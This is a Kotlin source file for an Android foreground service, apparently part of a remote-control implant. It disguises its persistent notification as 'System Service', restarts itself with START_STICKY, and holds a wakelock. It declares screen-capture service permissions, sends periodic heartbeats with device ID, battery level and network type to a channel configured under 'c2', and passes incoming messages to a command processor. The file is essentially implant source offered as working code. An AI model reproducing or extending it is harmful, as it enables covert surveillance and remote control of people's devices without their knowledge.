// ============================================================
// FILE: android/app/src/main/java/com/xrc/svc/XrcForegroundService.kt
// ============================================================
package com.xrc.svc

import android.app.Notification
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.lifecycle.LifecycleService
import androidx.lifecycle.lifecycleScope
import com.xrc.XrcActivity
import com.xrc.XrcApplication
import com.xrc.R
import com.xrc.core.config.XrcConfig
import com.xrc.core.net.NetworkUtils
import kotlinx.coroutines.*

/**
 * XrcForegroundService — persistent foreground service.
 *
 * Required for long-running background operation on Android 8+.
 * Declared foregroundServiceType: dataSync|specialUse|mediaProjection
 *
 * Features:
 * - START_STICKY restart behavior
 * - Wakelock acquisition
 * - Heartbeat and command processing
 * - Configurable notification (low priority, hidden)
 */
class XrcForegroundService : LifecycleService() {

    companion object {
        const val ACTION_START = "com.xrc.action.START"
        const val ACTION_STOP = "com.xrc.action.STOP"
        private const val TAG = "XrcFgSvc"
    }

    private var serviceScope: CoroutineScope? = null
    private var wakeLock: PowerManager.WakeLock? = null

    override fun onCreate() {
        super.onCreate()
        android.util.Log.i(TAG, "Foreground service created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)

        when (intent?.action) {
            ACTION_START -> {
                startForeground()
                initializeService()
            }
            ACTION_STOP -> {
                stopForeground()
                serviceScope?.cancel()
                stopSelf()
            }
        }

        return START_STICKY
    }

    override fun onBind(intent: Intent): IBinder? {
        super.onBind(intent)
        return null
    }

    override fun onDestroy() {
        serviceScope?.cancel()
        releaseWakeLock()
        android.util.Log.i(TAG, "Foreground service destroyed")
        super.onDestroy()
    }

    @OptIn(ExperimentalStdlibApi::class)
    private fun startForeground() {
        val notification = buildNotification()
        startForeground(XrcApplication.NOTIFICATION_ID_FOREGROUND, notification)
    }

    private fun buildNotification(): Notification {
        val channelId = XrcApplication.CHANNEL_CORE
        val pendingIntent = PendingIntent.getActivity(
            this, 0,
            Intent(this, XrcActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val builder = Notification.Builder(this, channelId)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setShowWhen(false)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            builder.setForegroundServiceBehavior(
                Notification.FOREGROUND_SERVICE_IMMEDIATE
            )
        }

        return builder.build()
    }

    private fun initializeService() {
        serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

        serviceScope?.launch {
            acquireWakeLock()

            val app = application as XrcApplication
            val serviceLocator = app.serviceLocator
            val channelClient = serviceLocator.channelClient
            val commandProcessor = serviceLocator.commandProcessor
            val config = serviceLocator.config

            // Initialize communications
            channelClient.initialize()

            // Set message handler
            channelClient.onMessage = { message ->
                commandProcessor.process(message)
            }

            // Start heartbeat
            startHeartbeat(channelClient, config)

            android.util.Log.i(TAG, "XRC service fully initialized")
        }
    }

    private suspend fun startHeartbeat(
        channelClient: com.xrc.comms.ChannelClient,
        config: XrcConfig
    ) {
        while (isActive) {
            val deviceId = com.xrc.core.crypto.Identity.getDeviceId(this@XrcForegroundService)
            val msg = com.xrc.comms.Message(
                type = com.xrc.comms.Protocol.TYPE_HEARTBEAT,
                id = "hb_${System.currentTimeMillis()}",
                device_id = deviceId,
                payload = com.xrc.comms.Protocol.json.encodeToString(
                    mapOf(
                        "battery" to getBatteryLevel(),
                        "network" to NetworkUtils.getNetworkType(this@XrcForegroundService).name,
                        "ts" to System.currentTimeMillis()
                    )
                )
            )
            channelClient.send(msg)

            delay(config.c2.heartbeat_interval_ms)
        }
    }

    private fun getBatteryLevel(): Int {
        return try {
            val intent = registerReceiver(null, android.content.IntentFilter(
                android.content.Intent.ACTION_BATTERY_CHANGED
            ))
            if (intent != null) {
                val level = intent.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1)
                val scale = intent.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1)
                if (level >= 0 && scale > 0) {
                    (level * 100) / scale
                } else 0
            } else 0
        } catch (e: Exception) {
            0
        }
    }

    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "xrc:wakelock"
            )
            wakeLock?.acquire(30 * 60 * 1000L) // 30 min max
        } catch (e: Exception) {
            android.util.Log.w(TAG, "Wake lock failed: ${e.message}")
        }
    }

    private fun releaseWakeLock() {
        try {
            wakeLock?.release()
        } catch (e: Exception) {
            // Ignore
        }
    }
}
